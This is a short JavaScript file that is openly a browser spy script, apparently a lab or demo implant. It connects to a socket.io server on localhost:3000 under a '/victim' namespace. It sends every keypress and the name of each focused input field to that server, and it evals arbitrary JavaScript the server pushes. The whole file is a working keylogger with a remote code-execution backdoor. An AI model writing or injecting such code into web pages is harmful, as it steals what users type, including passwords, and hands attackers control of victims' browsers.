/* globals io */
(function () {
  function loadScript(url, callback) {
    var head = document.getElementsByTagName("head")[0];
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = url;
    script.onreadystatechange = callback;
    script.onload = callback;
    head.appendChild(script);
  }

  function loadAllScripts() {
    loadScript("http://localhost:3000/socket.io/socket.io.js", init);
  }

  function spyOnKeyPress(socket) {
    document.addEventListener("keydown", function (e) {
      socket.emit("update", {
        type: "keypress",
        key: e.key, // Actual key pressed (e.g., "a", "Enter", "ArrowUp")
        code: e.code, // Physical key name (e.g., "KeyA", "Enter", "ArrowUp")
      });

      console.log("Key pressed:", e.key, e.code); // Debugging
    });
  }

  function spyOnFieldFocus(socket) {
    function fieldName(field) {
      if (field.id) return "#" + field.id;
      if (field.className) return "." + field.className.replace(/\s+/g, ".");
      return "[" + field.type + "]";
    }

    function emitChange() {
      socket.emit("update", {
        type: "element-change",
        msg: fieldName(this),
      });

      console.log("Focused on:", fieldName(this)); // Debugging
    }

    function addListenersToFields() {
      document.querySelectorAll("input,textarea").forEach((field) => {
        field.onfocus = emitChange;
      });
    }

    addListenersToFields();

    // Monitor dynamically added input fields
    const observer = new MutationObserver(addListenersToFields);
    observer.observe(document.body, { childList: true, subtree: true });
  }

  function listenToRemoteJs(socket) {
    socket.on("runRemoteJs", function (js) {
      eval(js);
    });
  }

  function init() {
    var socket = io("http://localhost:3000/victim");

    spyOnKeyPress(socket);
    spyOnFieldFocus(socket);
    listenToRemoteJs(socket);
  }

  loadAllScripts();
})();
